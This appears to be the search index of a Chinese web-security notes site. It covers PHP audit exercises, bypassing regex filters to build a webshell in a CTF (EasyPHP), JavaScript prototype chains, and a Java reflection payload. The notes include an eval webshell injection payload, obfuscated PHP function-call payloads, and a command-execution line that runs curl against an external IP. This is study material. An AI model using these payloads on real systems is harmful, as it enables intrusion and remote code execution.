'xxxxx/option.php' ); $file = preg_replace ( '|\\$option=\\'.*\\';|' , \" \\$ option=' $str ';\" , $file ); file_put_contents ( 'xxxxx/option.php' , $file ); \u4e00\u822c\u7684\u89e3\u6cd5\uff1a \u5148\u8bbf\u95ee\uff1a 1 \u518d\u8bbf\u95ee\uff1a 1 \u8fd9\u65f6\u5019\u5c31\u53ef\u4ee5 getshell \u4e86 \u53e6\u4e00\u79cd\u65b9\u6cd5\uff1a 1 \u7ecf\u8fc7addslashes\u540e\uff0c$str\u4e3a aaa\\\\\\';phpinfo();// \u7ecf\u8fc7preg_replace\u6b63\u5219\u5339\u914d\u540e\uff0c\u5bf9 \\ \u505a\u4e86\u8f6c\u4e49\u5904\u7406,xxxxx/option.php\u7684\u5185\u5bb9\u53d8\u4e3a\uff1a 1 2 3 <?php $option='aaa\\\\';phpinfo();//'; ?> \u6700\u540e\u8bbf\u95ee\uff1a/xxxxx/option.php \u540c\u65f6\u770b\u5230\u6709\u4e2a\u5e08\u5085\u7ed9\u7684payload\uff0c\u4f46\u662f\u4e0d\u592a\u7406\u89e3 1 option=;&option=%5c%27;eval($_POST[1]);// Exponent CMS 2.3.9 \u914d\u7f6e\u6587\u4ef6\u5199\u5165 getshell\u5206\u6790 \u6b63\u5219\u7ecf\u5178\u6f0f\u6d1e \u5ba1\u8ba1\u7ec3\u4e60\u98982 \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 <?php if ( isset ( $_SERVER [ 'HTTP_CONTENT_DISPOSITION' ])) { if ( preg_match ( '/attachment;\\s+name=\"(.+?)\";\\s+filename=\"(.+?)\"/i' , $_SERVER [ 'HTTP_CONTENT_DISPOSITION' ], $info )) { $temp_name = tmpfile (); echo $temp_name ; echo \" \\r\\n \" ; $content = file_get_contents ( \"php://input\" ); print_r ( $content ); echo \" \\r\\n \" ; fwrite ( $temp_name , $content ); fseek ( $temp_name , 0 ); $size = strlen ( $content ); $_FILES [ $info [ 1 ]] = array ( 'name' => $info [ 2 ], 'tmp_name' => $temp_name , 'size' => $size , 'type' => '' , 'error' => 0 ); } } \u4e0d\u77e5\u9053\u8fd9\u4e2a\u80fd\u591f getshell ? \u5ba1\u8ba1\u7ec3\u4e60\u98983 \u00b6","title":"\u5c0f\u5bc6\u5708\u6458\u5f55\u7684\u5185\u5bb9"},{"location":"web_sec/advanAudit/\u5c0f\u5bc6\u5708\u6458\u5f55/#_1","text":"","title":"\u5c0f\u5bc6\u5708\u6458\u5f55\u7684\u5185\u5bb9"},{"location":"web_sec/advanAudit/\u5c0f\u5bc6\u5708\u6458\u5f55/#1","text":"1 2 3 4 5 <?php $str = addslashes ( $_GET [ 'option' ]); $file = file_get_contents ( 'xxxxx/option.php' ); $file = preg_replace ( '|\\$option=\\'.*\\';|' , \" \\$ option=' $str ';\" , $file ); file_put_contents ( 'xxxxx/option.php' , $file ); \u4e00\u822c\u7684\u89e3\u6cd5\uff1a \u5148\u8bbf\u95ee\uff1a 1 \u518d\u8bbf\u95ee\uff1a 1 \u8fd9\u65f6\u5019\u5c31\u53ef\u4ee5 getshell \u4e86 \u53e6\u4e00\u79cd\u65b9\u6cd5\uff1a 1 \u7ecf\u8fc7addslashes\u540e\uff0c$str\u4e3a aaa\\\\\\';phpinfo();// \u7ecf\u8fc7preg_replace\u6b63\u5219\u5339\u914d\u540e\uff0c\u5bf9 \\ \u505a\u4e86\u8f6c\u4e49\u5904\u7406,xxxxx/option.php\u7684\u5185\u5bb9\u53d8\u4e3a\uff1a 1 2 3 <?php $option='aaa\\\\';phpinfo();//'; ?> \u6700\u540e\u8bbf\u95ee\uff1a/xxxxx/option.php \u540c\u65f6\u770b\u5230\u6709\u4e2a\u5e08\u5085\u7ed9\u7684payload\uff0c\u4f46\u662f\u4e0d\u592a\u7406\u89e3 1 option=;&option=%5c%27;eval($_POST[1]);// Exponent CMS 2.3.9 \u914d\u7f6e\u6587\u4ef6\u5199\u5165 getshell\u5206\u6790 \u6b63\u5219\u7ecf\u5178\u6f0f\u6d1e","title":"\u5ba1\u8ba1\u7ec3\u4e60\u98981"},{"location":"web_sec/advanAudit/\u5c0f\u5bc6\u5708\u6458\u5f55/#2","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 <?php if ( isset ( $_SERVER [ 'HTTP_CONTENT_DISPOSITION' ])) { if ( preg_match ( '/attachment;\\s+name=\"(.+?)\";\\s+filename=\"(.+?)\"/i' , $_SERVER [ 'HTTP_CONTENT_DISPOSITION' ], $info )) { $temp_name = tmpfile (); echo $temp_name ; echo \" \\r\\n \" ; $content = file_get_contents ( \"php://input\" ); print_r ( $content ); echo \" \\r\\n \" ; fwrite ( $temp_name , $content ); fseek ( $temp_name , 0 ); $size = strlen ( $content ); $_FILES [ $info [ 1 ]] = array ( 'name' => $info [ 2 ], 'tmp_name' => $temp_name , 'size' => $size , 'type' => '' , 'error' => 0 ); } } \u4e0d\u77e5\u9053\u8fd9\u4e2a\u80fd\u591f getshell ?","title":"\u5ba1\u8ba1\u7ec3\u4e60\u98982"},{"location":"web_sec/advanAudit/\u5c0f\u5bc6\u5708\u6458\u5f55/#3","text":"","title":"\u5ba1\u8ba1\u7ec3\u4e60\u98983"},{"location":"web_sec/advanAudit/\u6784\u9020Webshell/","text":"\u6784\u9020webshell \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 <?php highlight_file ( __FILE__ ); $_ = @ $_GET [ '_' ]; if ( preg_match ( '/[\\x00- 0-9\\'\"`$&.,|[{_defgops\\x7F]+/i' , $_ ) ) die ( 'ros\u00e9 will not do it' ); if ( strlen ( count_chars ( strtolower ( $_ ), 0x3 )) > 0xd ) die ( 'you are so close, omg' ); eval ( $_ ); ?> \u4e24\u5904\u8fc7\u6ee4\uff0c\u4e00\u521d\u662f\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u7b2c\u4e8c\u4e2a\u8fc7\u6ee4\uff0c strtolower \u5c06\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u5c0f\u5199\uff0c\u7528 count_chars \u8fd4\u56de\u7531\u6240\u6709\u4f7f\u7528\u4e86\u7684\u5b57\u8282\u503c\u7ec4\u6210\u7684\u5b57\u7b26\u4e32\uff0c\u518d\u5224\u65ad\u5176\u4e2d\u6bcf\u4e2a\u5b57\u7b26\u7d2f\u8ba1\u51fa\u73b0\u6b21\u6570\u662f\u5426\u5927\u4e8e 13 \u5173\u4e8e count_chars \u51fd\u6570\uff0c\u6d4b\u8bd5\u5982\u4e0b\uff1a 1 \u7ed3\u679c\u5982\u4e0b\uff1a 1 \u4ece\u7ed3\u679c\u53ef\u4ee5\u770b\u51fa\u5176\u5b9e\u5c31\u662f\u5c06\u4e00\u4e2a\u5b57\u7b26\u4e32\u4e2d\u51fa\u73b0\u7684\u6240\u6709\u5b57\u7b26\u90fd\u62ff\u51fa\u6765\u7ec4\u6210\u4e00\u4e2a\u96c6\u5408 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 <?php $arr = get_defined_functions ()[ 'internal' ]; foreach ( $arr as $key => $value ) { if ( preg_match ( '/[\\x00- 0-9\\'\"`$&.,|[{_defgops\\x7F]+/i' , $value ) ){ unset ( $arr [ $key ]); continue ; } if ( strlen ( count_chars ( strtolower ( $value ), 0x3 )) > 0xd ){ unset ( $arr [ $key ]); continue ; } } var_dump ( $arr ); ?> \u5f97\u5230\uff1a 1 step2 \u00b6 \u867d\u7136\u53cc\u5f15\u53f7\u8ddf\u5355\u5f15\u53f7\u90fd\u88ab ban \u6389\u4e86\uff0c\u4f46\u662f\u6211\u4eec\u77e5\u9053 php \u5728\u83b7\u53d6 HTTP GET \u53c2\u6570\u7684\u65f6\u5019\u9ed8\u8ba4\u662f\u83b7\u5f97\u5230\u4e86\u5b57\u7b26\u4e32\u7c7b\u578b\uff0c\u6240\u4ee5\u5373\u4f7f\u53cc\u5f15\u53f7\u8ddf\u5355\u5f15\u53f7\u88ab ban \u4e86\u5176\u5b9e\u5e76\u6ca1\u6709\u592a\u5927\u7684\u5f71\u54cd\u3002\u800c\u6211\u4eec\u8fd8\u53ef\u4ee5\u77e5\u9053\uff0c\u5b57\u7b26\u4e32\u8fd8\u53ef\u4ee5\u7528 ! \u64cd\u4f5c\u7b26\u6765\u8fdb\u884c\u5e03\u5c14\u7c7b\u578b\u7684\u8f6c\u6362\uff0c\u5982\u4e0b\uff1a 1 2 3 4 5 6 php > var_dump(!a); PHP Notice: Use of undefined constant a - assumed 'a' in php shell code on line 1 bool(false) php > var_dump(!!a); PHP Notice: Use of undefined constant a - assumed 'a' in php shell code on line 1 bool(true) \u53ef\u4ee5\u518d\u52a0\u4e00\u4e2a @ \u5ffd\u7565 notice \u8f93\u51fa 1 2 3 4 <?php var_dump(@a); //string(1) \"a\" var_dump(!@a); //bool(false) var_dump(!!@a); //bool(true) \u800c\u5bf9 bool \u7c7b\u578b\u4f7f\u7528\u52a0\u6cd5\u7684\u65f6\u5019\uff0c php \u5219\u4f1a\u5c06 bool \u7c7b\u578b\u5904\u7406\u4e3a\u6570\u5b57\uff0c true \u8f6c\u6362\u4e3a 1 \uff0c false \u4e3a 0 \uff0c\u6240\u4ee5\u6211\u4eec\u53c8\u53ef\u4ee5\u5229\u7528\u8fd9\u4e00\u70b9\u6765\u5b9e\u73b0\u6570\u5b57\u8ba1\u7b97\uff1a 1 2 3 <?php var_dump ( !!@ a + !!@ a ); //int(2) 1+1 var_dump (( !!@ a + !!@ a ) * ( !!@ a + !!@ a + !!@ a + !!@ a )); //int(6) (1+1)*(1+1+0+1) \u53c2\u8003 \u00b6 ISITDTU CTF 2019 EasyPHP \u56de\u987e","title":"\u6784\u9020webshell"},{"location":"web_sec/advanAudit/\u6784\u9020Webshell/#webshell","text":"1 2 3 4 5 6 7 8 9 10 11 12 <?php highlight_file ( __FILE__ ); $_ = @ $_GET [ '_' ]; if ( preg_match ( '/[\\x00- 0-9\\'\"`$&.,|[{_defgops\\x7F]+/i' , $_ ) ) die ( 'ros\u00e9 will not do it' ); if ( strlen ( count_chars ( strtolower ( $_ ), 0x3 )) > 0xd ) die ( 'you are so close, omg' ); eval ( $_ ); ?> \u4e24\u5904\u8fc7\u6ee4\uff0c\u4e00\u521d\u662f\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u7b2c\u4e8c\u4e2a\u8fc7\u6ee4\uff0c strtolower \u5c06\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u5c0f\u5199\uff0c\u7528 count_chars \u8fd4\u56de\u7531\u6240\u6709\u4f7f\u7528\u4e86\u7684\u5b57\u8282\u503c\u7ec4\u6210\u7684\u5b57\u7b26\u4e32\uff0c\u518d\u5224\u65ad\u5176\u4e2d\u6bcf\u4e2a\u5b57\u7b26\u7d2f\u8ba1\u51fa\u73b0\u6b21\u6570\u662f\u5426\u5927\u4e8e 13 \u5173\u4e8e count_chars \u51fd\u6570\uff0c\u6d4b\u8bd5\u5982\u4e0b\uff1a 1 \u7ed3\u679c\u5982\u4e0b\uff1a 1 \u4ece\u7ed3\u679c\u53ef\u4ee5\u770b\u51fa\u5176\u5b9e\u5c31\u662f\u5c06\u4e00\u4e2a\u5b57\u7b26\u4e32\u4e2d\u51fa\u73b0\u7684\u6240\u6709\u5b57\u7b26\u90fd\u62ff\u51fa\u6765\u7ec4\u6210\u4e00\u4e2a\u96c6\u5408 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 <?php $arr = get_defined_functions ()[ 'internal' ]; foreach ( $arr as $key => $value ) { if ( preg_match ( '/[\\x00- 0-9\\'\"`$&.,|[{_defgops\\x7F]+/i' , $value ) ){ unset ( $arr [ $key ]); continue ; } if ( strlen ( count_chars ( strtolower ( $value ), 0x3 )) > 0xd ){ unset ( $arr [ $key ]); continue ; } } var_dump ( $arr ); ?> \u5f97\u5230\uff1a 1","title":"\u6784\u9020webshell"},{"location":"web_sec/advanAudit/\u6784\u9020Webshell/#step2","text":"\u867d\u7136\u53cc\u5f15\u53f7\u8ddf\u5355\u5f15\u53f7\u90fd\u88ab ban \u6389\u4e86\uff0c\u4f46\u662f\u6211\u4eec\u77e5\u9053 php \u5728\u83b7\u53d6 HTTP GET \u53c2\u6570\u7684\u65f6\u5019\u9ed8\u8ba4\u662f\u83b7\u5f97\u5230\u4e86\u5b57\u7b26\u4e32\u7c7b\u578b\uff0c\u6240\u4ee5\u5373\u4f7f\u53cc\u5f15\u53f7\u8ddf\u5355\u5f15\u53f7\u88ab ban \u4e86\u5176\u5b9e\u5e76\u6ca1\u6709\u592a\u5927\u7684\u5f71\u54cd\u3002\u800c\u6211\u4eec\u8fd8\u53ef\u4ee5\u77e5\u9053\uff0c\u5b57\u7b26\u4e32\u8fd8\u53ef\u4ee5\u7528 ! \u64cd\u4f5c\u7b26\u6765\u8fdb\u884c\u5e03\u5c14\u7c7b\u578b\u7684\u8f6c\u6362\uff0c\u5982\u4e0b\uff1a 1 2 3 4 5 6 php > var_dump(!a); PHP Notice: Use of undefined constant a - assumed 'a' in php shell code on line 1 bool(false) php > var_dump(!!a); PHP Notice: Use of undefined constant a - assumed 'a' in php shell code on line 1 bool(true) \u53ef\u4ee5\u518d\u52a0\u4e00\u4e2a @ \u5ffd\u7565 notice \u8f93\u51fa 1 2 3 4 <?php var_dump(@a); //string(1) \"a\" var_dump(!@a); //bool(false) var_dump(!!@a); //bool(true) \u800c\u5bf9 bool \u7c7b\u578b\u4f7f\u7528\u52a0\u6cd5\u7684\u65f6\u5019\uff0c php \u5219\u4f1a\u5c06 bool \u7c7b\u578b\u5904\u7406\u4e3a\u6570\u5b57\uff0c true \u8f6c\u6362\u4e3a 1 \uff0c false \u4e3a 0 \uff0c\u6240\u4ee5\u6211\u4eec\u53c8\u53ef\u4ee5\u5229\u7528\u8fd9\u4e00\u70b9\u6765\u5b9e\u73b0\u6570\u5b57\u8ba1\u7b97\uff1a 1 2 3 <?php var_dump ( !!@ a + !!@ a ); //int(2) 1+1 var_dump (( !!@ a + !!@ a ) * ( !!@ a + !!@ a + !!@ a + !!@ a )); //int(6) (1+1)*(1+1+0+1)","title":"step2"},{"location":"web_sec/advanAudit/\u6784\u9020Webshell/#_1","text":"ISITDTU CTF 2019 EasyPHP \u56de\u987e","title":"\u53c2\u8003"},{"location":"web_sec/advanAudit/\u7406\u89e3JavaScript\u7684\u539f\u578b\u94fe/","text":"\u7406\u89e3JavaScript\u7684\u539f\u578b\u94fe \u00b6 \u5148\u653e\u56fe\uff0c\u540e\u9762\u7684\u8c03\u8bd5\u90fd\u8ddf\u7740\u56fe\u7247\u6765\u8d70 \u7c7b\u4e0e\u5bf9\u8c61\u7684\u539f\u578b \u00b6 \u5148\u770b\u5c0f\u56fe \u6807\u53f7\u4e3a1\u7684\u5173\u7cfb: foo.__proto__ == Foo.prototype \u7b2c\u4e8c\u6761\u7ebf\u6bd4\u8f83\u597d\u7406\u89e3\uff0c Foo.prototype \u5c31\u662f Foo \u7684\u4e00\u4e2a\u5c5e\u6027 \u90a3\u600e\u4e48\u7406\u89e3 Foo.prototype \u5462\uff1f \u4e5f\u5c31\u662f\u8bf4 Foo.prototype \u4e2d\u6709\u4e00\u4e2a\u5c5e\u6027\u53eb\u505a constuctor \uff0c\u8fd9\u4e2a\u5c5e\u6027\u6307\u5411\u4e86\u81ea\u8eab \u5176\u5b9e\u4ece\u540d\u5b57\u4e0a\u6765\u8bf4\u4e5f\u597d\u89e3\u91ca\uff0c constructor \u5c31\u662f\u6784\u9020\u7684\u610f\u601d\uff0c prototype \u7684\u6784\u9020\u5f53\u7136\u662f Foo \u81ea\u5df1 \u6240\u4ee5\u6709\u4e00\u4e2a\u5f88\u6709\u610f\u601d\u7684\u4e8b\u60c5 \u8fd9\u6837\u6784\u6210\u4e00\u4e2a\u5faa\u73af\u4e86 \u7c7b\u548cFunction\u7684\u539f\u578b \u00b6 \u90a3\u4e48\u95ee\u9898\u5c31\u6765\u4e86\uff0c\u8c01\u6765\u6784\u9020 Foo \u5462\uff1f \u6211\u4eec\u770b\u5230\u662f\u4e00\u4e2a Function \u7684\u7c7b\u6765\u6784\u9020 Foo \uff0c\u8fd9\u4e2a Function \u5c31\u662f\u6240\u6709\u51fd\u6570\u7684\u7238\u7238\u4e86 \u90a3\u4e48\u597d\u5947\u7684\u4e8b\u60c5\u6765\u4e86\uff0c Foo.__proto__ \u662f\u4e0d\u662f\u4f1a\u7b49\u4e8e Function.prototype \u5462\uff1f \u7b54\u6848\u662f\u6b63\u786e\u7684 \u8fd9\u5c31\u548c\u4e4b\u524d Foo \u548c foo \u7684\u5173\u7cfb\u76f8\u4f3c\u4e86 \u90a3\u4e48\u6700\u5f00\u59cb\u7684\u90a3\u4e2a\u56fe\u5176\u5b9e\u8fd8\u5c11\u753b\u4e86\u4e00\u67612333 Foo.prototype\u7684\u539f\u578b \u00b6 Foo \u7684 __proto__ \u548c constructor \u89e3\u51b3\u4e86 \u90a3\u4e48 Foo.prototype \u7684 __proto__ \u8fd8\u6ca1\u6709\u89e3\u51b3\u5462 \u6211\u4eec\u770b\u5230\u662f\u6307\u5411\u4e86 Object \u7684 prototype \u540c\u65f6\u53ef\u4ee5\u770b\u5230 Function.prototype \u7684 __proto__ \u4e5f\u6307\u5411\u4e86 Object.prototype \u5c31\u6b63\u597d\u5bf9\u5e94\u8fd9\u5e45\u56fe\u4e86 \u540c\u65f6 Object \u8fd9\u4e2a\u5927boss,\u5b83\u7684\u6784\u9020\u662f\u7531\u4e00\u4e2a\u53eb\u505a Object \u7684\u51fd\u6570\u6765\u5b8c\u6210\u7684 \u90a3\u8fd9\u4e2a\u65f6\u5019\uff0c\u8fd9\u4e2a\u51fd\u6570\u5176\u5b9e\u8fd8\u662f\u5c5e\u4e8e Function \u7684hhh \u6240\u4ee5\u5c31\u4f1a\u6709\u8fd9\u4e2a\u8be1\u5f02\u7684\u4e00\u5e55\uff1a","title":"\u7406\u89e3JavaScript\u7684\u539f\u578b\u94fe"},{"location":"web_sec/advanAudit/\u7406\u89e3JavaScript\u7684\u539f\u578b\u94fe/#javascript","text":"\u5148\u653e\u56fe\uff0c\u540e\u9762\u7684\u8c03\u8bd5\u90fd\u8ddf\u7740\u56fe\u7247\u6765\u8d70","title":"\u7406\u89e3JavaScript\u7684\u539f\u578b\u94fe"},{"location":"web_sec/advanAudit/\u7406\u89e3JavaScript\u7684\u539f\u578b\u94fe/#_1","text":"\u5148\u770b\u5c0f\u56fe \u6807\u53f7\u4e3a1\u7684\u5173\u7cfb: foo.__proto__ == Foo.prototype \u7b2c\u4e8c\u6761\u7ebf\u6bd4\u8f83\u597d\u7406\u89e3\uff0c Foo.prototype \u5c31\u662f Foo \u7684\u4e00\u4e2a\u5c5e\u6027 \u90a3\u600e\u4e48\u7406\u89e3 Foo.prototype \u5462\uff1f \u4e5f\u5c31\u662f\u8bf4 Foo.prototype \u4e2d\u6709\u4e00\u4e2a\u5c5e\u6027\u53eb\u505a constuctor \uff0c\u8fd9\u4e2a\u5c5e\u6027\u6307\u5411\u4e86\u81ea\u8eab \u5176\u5b9e\u4ece\u540d\u5b57\u4e0a\u6765\u8bf4\u4e5f\u597d\u89e3\u91ca\uff0c constructor \u5c31\u662f\u6784\u9020\u7684\u610f\u601d\uff0c prototype \u7684\u6784\u9020\u5f53\u7136\u662f Foo \u81ea\u5df1 \u6240\u4ee5\u6709\u4e00\u4e2a\u5f88\u6709\u610f\u601d\u7684\u4e8b\u60c5 \u8fd9\u6837\u6784\u6210\u4e00\u4e2a\u5faa\u73af\u4e86","title":"\u7c7b\u4e0e\u5bf9\u8c61\u7684\u539f\u578b"},{"location":"web_sec/advanAudit/\u7406\u89e3JavaScript\u7684\u539f\u578b\u94fe/#function","text":"\u90a3\u4e48\u95ee\u9898\u5c31\u6765\u4e86\uff0c\u8c01\u6765\u6784\u9020 Foo \u5462\uff1f \u6211\u4eec\u770b\u5230\u662f\u4e00\u4e2a Function \u7684\u7c7b\u6765\u6784\u9020 Foo \uff0c\u8fd9\u4e2a Function \u5c31\u662f\u6240\u6709\u51fd\u6570\u7684\u7238\u7238\u4e86 \u90a3\u4e48\u597d\u5947\u7684\u4e8b\u60c5\u6765\u4e86\uff0c Foo.__proto__ \u662f\u4e0d\u662f\u4f1a\u7b49\u4e8e Function.prototype \u5462\uff1f \u7b54\u6848\u662f\u6b63\u786e\u7684 \u8fd9\u5c31\u548c\u4e4b\u524d Foo \u548c foo \u7684\u5173\u7cfb\u76f8\u4f3c\u4e86 \u90a3\u4e48\u6700\u5f00\u59cb\u7684\u90a3\u4e2a\u56fe\u5176\u5b9e\u8fd8\u5c11\u753b\u4e86\u4e00\u67612333","title":"\u7c7b\u548cFunction\u7684\u539f\u578b"},{"location":"web_sec/advanAudit/\u7406\u89e3JavaScript\u7684\u539f\u578b\u94fe/#fooprototype","text":"Foo \u7684 __proto__ \u548c constructor \u89e3\u51b3\u4e86 \u90a3\u4e48 Foo.prototype \u7684 __proto__ \u8fd8\u6ca1\u6709\u89e3\u51b3\u5462 \u6211\u4eec\u770b\u5230\u662f\u6307\u5411\u4e86 Object \u7684 prototype \u540c\u65f6\u53ef\u4ee5\u770b\u5230 Function.prototype \u7684 __proto__ \u4e5f\u6307\u5411\u4e86 Object.prototype \u5c31\u6b63\u597d\u5bf9\u5e94\u8fd9\u5e45\u56fe\u4e86 \u540c\u65f6 Object \u8fd9\u4e2a\u5927boss,\u5b83\u7684\u6784\u9020\u662f\u7531\u4e00\u4e2a\u53eb\u505a Object \u7684\u51fd\u6570\u6765\u5b8c\u6210\u7684 \u90a3\u8fd9\u4e2a\u65f6\u5019\uff0c\u8fd9\u4e2a\u51fd\u6570\u5176\u5b9e\u8fd8\u662f\u5c5e\u4e8e Function \u7684hhh \u6240\u4ee5\u5c31\u4f1a\u6709\u8fd9\u4e2a\u8be1\u5f02\u7684\u4e00\u5e55\uff1a","title":"Foo.prototype\u7684\u539f\u578b"},{"location":"web_sec/audit/","text":"\u4ee3\u7801\u5ba1\u8ba1 \u00b6 \u8bb0\u5f55\u4ee3\u7801\u5ba1\u8ba1\u7684\u5c0ftrick","title":"\u4ee3\u7801\u5ba1\u8ba1"},{"location":"web_sec/audit/#_1","text":"\u8bb0\u5f55\u4ee3\u7801\u5ba1\u8ba1\u7684\u5c0ftrick","title":"\u4ee3\u7801\u5ba1\u8ba1"},{"location":"web_sec/audit/code-breaking/","text":"code-breaking \u00b6 java-con\u5206\u6790 \u00b6 payload1 \u53ef\u4ee5\u7528\u6765\u6267\u884c\u547d\u4ee4 1 String . class . getClass (). forName ( \"java.l\" + \"ang.Ru\" + \"ntime\" ). getMethod ( \"ex\" + \"ec\" , String . class ). invoke ( String . class . getClass (). forName ( \"java.l\" + \"ang.Ru\" + \"ntime\" ). getMethod ( \"getRu\" + \"ntime\" ). invoke ( String . class . getClass (). forName ( \"java.l\" + \"ang.Ru\" + \"ntime\" )), \"curl 39.106.125.244:8888\" (\u6ce8\u610f\u8fd9\u4e2apayload\u8fd8\u6709\u70b9\u5c0f\u95ee\u9898\uff0c\u9700\u8981\u5c06exec\u5b57\u7b26\u4e32\u62c6\u5f00) wp1 wp0","title":"code-breaking"},{"location":"web_sec/audit/code-breaking/#code-breaking","text":"","title":"code-breaking"},{"location":"web_sec/audit/code-breaking/#java-con","text":"payload1 \u53ef\u4ee5\u7528\u6765\u6267\u884c\u547d\u4ee4 1 String . class . getClass (). forName ( \"java.l\" + \"ang.Ru\" + \"ntime\" ). getMethod ( \"ex\" + \"ec\" , String . class ). invoke ( String . class . getClass (). forName ( \"java.l\" + \"ang.Ru\" + \"ntime\" ). getMethod ( \"getRu\" + \"ntime\" ). invoke ( String . class . getClass (). forName ( \"java.l\" + \"ang.Ru\" + \"ntime\" )), \"curl 39.106.125.244:8888\" (\u6ce8\u610f\u8fd9\u4e2apayload\u8fd8\u6709\u70b9\u5c0f\u95ee\u9898\uff0c\u9700\u8981\u5c06exec\u5b57\u7b26\u4e32\u62c6\u5f00) wp1 wp0","title":"java-con\u5206\u6790"},{"location":"web_sec/audit/easyphp/","text":"webshell\u6784\u9020\u5b9e\u4f8b\u2014\u2014EasyPHP \u00b6 Description \u00b6 Don't try to run any Linux command, just use all the PHP functions you know to get the flag http://165.22.57.95:8000/ First look \u00b6 \u6e90\u4ee3\u7801\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 <?php highlight_file ( __FILE__ ); $_ = @ $_GET [ '_' ]; if ( preg_match ( '/[\\x00- 0-9\\'\"`$&.,|[{_defgops\\x7F]+/i' , $_ ) ) die ( 'ros\u00e9 will not do it' ); if ( strlen ( count_chars ( strtolower ( $_ ), 0x3 )) > 0xd ) die ( 'you are so close, omg' ); eval ( $_ ); ?> \u9700\u8981\u7ed5\u8fc7\u4e24\u4e2a\u5224\u65ad\uff0c\u904d\u5386\u4e00\u4e0bphp\u4e2d\u7684\u51fd\u6570\u770b\u4e00\u4e0b\u8fd8\u6709\u54ea\u4e9b\u80fd\u7528 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 <?php $arr = get_defined_functions ()[ 'internal' ]; foreach ( $arr as $key => $value ) { if ( preg_match ( '/[\\x00- 0-9\\'\"`$&.,|[{_defgops\\x7F]+/i' , $value ) ){ unset ( $arr [ $key ]); continue ; } if ( strlen ( count_chars ( strtolower ( $value ), 0x3 )) > 0xd ){ unset ( $arr [ $key ]); continue ; } } var_dump ( $arr ); ?> \u5f97\u5230\u5982\u4e0b\u51fd\u6570 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 bcmul rtrim trim ltrim chr link unlink tan atan atanh tanh intval mail min max chr \u548c intval \u53ef\u80fd\u53ef\u4ee5\u5229\u7528\u4f46\u662f\u8fc7\u6ee4\u4e86 . Looking for a right path \u00b6 How can we generate numbers then? There comes PHP syntax and behaviour with help! Basically in PHP strings have to be quoted using \" or ' . Although those characters are restricted by regex condition, PHP acts in pretty weird way, if we don't quote string - it assumes we've simply forgotten to quote it, produces notice and creates string anyway (only a-ZA-Z characters are valid in this case). Also, notice can be easily suppressed using @ which is permitted by regex. How can we get number from string, though? In this case we can simply use PHP's amazing type juggling: 1 2 3 <?php $a = !!@ i ; echo $a ; // produces boolean(true) String i is casted to false via ! operator, then negated by another ! and we have logical true . Booleans are casted to integer, when any arithmetic is used on them, so we can produce any number we want! For example: 1 2 <?php echo ( !!@ i + !!@ i ) ** ( !!@ i + !!@ i + !!@ i + !!@ i ); //outputs 2^4 = 16 Cool! Now we can create any number and one-char string using chr(asciinumber) function. Another usable PHP feature in our case is that we can call functions using strings. For example \"phpinfo\"(); equals phpinfo(); Now we have one-char-strings and ability to call functions using strings. There are not much one-char functions though - to be specific there's only one: _() which is alias for gettext() function which is used to translate strings. Not very useful. The plan now is to find a way to create string - either by concatenating one-letter strings or any method. I've spent long hours trying to figure out how to concatenate strings without using . operator (which is exactly string concatenation operator, but forbidden by regex), but I've been failing and failing... After hours of struggle, the very next morning I've re-analysed regex condition once again (for like 10 th time), and focused on operators allowed. Those are: ['!', '%', '+', '-', '*', '/', '>', '<', '?', '=', ':', '@', '^'] Eventually I noticed something interesting in PHP documentation: https://www.php.net/manual/en/language.operators.bitwise.php If both operands for the &, | and ^ operators are strings, then the operation will be performed on the ASCII values of the characters that make up the strings and the result will be a string. In all other cases, both operands will be converted to integers and the result will be an integer. This is exactly what we need. ^ stands for bitwise XOR, and if applied on strings, it XORs char by char. I have also tried out some XOR results, and it turned out, that it is possible to create lowercase characters by XORing uppercase character with a number, for example: 1 echo @ASD^\"123\"; //produces string 'paw' We already know how to create string using only permitted characters, and also how to create any number we want. If only number was string representation of integer, we could determine pairs of Uppercase letter ^ [0-9] which XORED result in ANY functions names! Next step is to create string representation for crafted number. Again, PHP type juggling arrives on a white horse yelling for attention: 1 2 <?php var_dump ( trim ( 123 )); //produces string(3) \"123\" trim(string $str) function takes string for argument, and if integer provided, simply casts it to string and returns it trimmed - this is our way to convert crafted numbers to strings. Exploitation \u00b6 Off we go, ready and steady to begin exploitation. I've written script which simply iterates through available characters and helps me to find possible Letter ^ [0-9] pairs for each character in provided function name and further generates payload which is encoded function name string. Having this I generated phpinfo(); string: 1 2 \"AQAQVQV\" ^ \"1918879\" //produces 'phpinfo' Payload: (AQAQVQV^trim(((((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i+!